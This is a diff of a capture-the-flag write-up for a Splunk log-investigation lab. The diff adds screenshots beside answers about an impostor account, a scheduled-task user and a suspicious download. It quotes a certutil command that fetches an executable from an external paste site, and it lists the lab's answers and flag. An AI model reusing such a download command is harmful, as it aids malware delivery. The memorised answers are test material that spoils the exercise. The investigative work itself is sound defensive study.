@@ -32,7 +32,8 @@ I started with a simple search on the whole index and set the time range to end 
 index=win_eventlogs
 ```
 
-[insert screenshot]
+<img width="945" height="137" alt="image" src="https://github.com/user-attachments/assets/d112cb10-a7f8-4104-be48-d9ce3469bb3d" />
+
 
 Answer: `13959`
 
@@ -49,7 +50,8 @@ index=win_eventlogs
 
 This returned 11 results. Going through the list, one name immediately looked off - **Amel1a**, with the digit "1" in place of the letter "i". It looks almost identical to the real user Amelia from Marketing, which is a classic trick to blend in. On top of that, it had only 1 event, which also made it stand out.
 
-[insert screenshot]
+<img width="1915" height="631" alt="image" src="https://github.com/user-attachments/assets/8ef7a383-f2f1-4be3-bed2-925022b1ac77" />
+
 
 Answer: `Amel1a`
 
@@ -66,7 +68,8 @@ index=win_eventlogs schtasks
 
 Comparing the results with the department list, only one of the users belonged to HR.
 
-[insert screenshot]
+<img width="1910" height="398" alt="image" src="https://github.com/user-attachments/assets/ecb4e025-3196-42fa-afac-77a6d8c8bf6c" />
+
 
 Answer: `Chris.fort`
 
@@ -98,7 +101,8 @@ certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
 
 This was clearly a file being downloaded from an external site - and funnily enough, the file is named after the room itself.
 
-[insert screenshot]
+<img width="945" height="587" alt="image" src="https://github.com/user-attachments/assets/61ca0a44-b768-4858-af40-fa5a2f04ad91" />
+
 
 Answer: `haroon`
 
@@ -142,7 +146,8 @@ Answer: `benign.exe`
 
 I didn't know controlc.com, so I googled it - it's a text-sharing site where you can publish and share text online. To see what was hiding there, I copied the full link from the command into my browser. The paste was still available and it contained the flag.
 
-[insert screenshot]
+<img width="592" height="345" alt="image" src="https://github.com/user-attachments/assets/e9ceeace-1f43-4852-94ba-971134ada0c3" />
+
 
 Answer: `THM{KJ&*H^B0}`
 
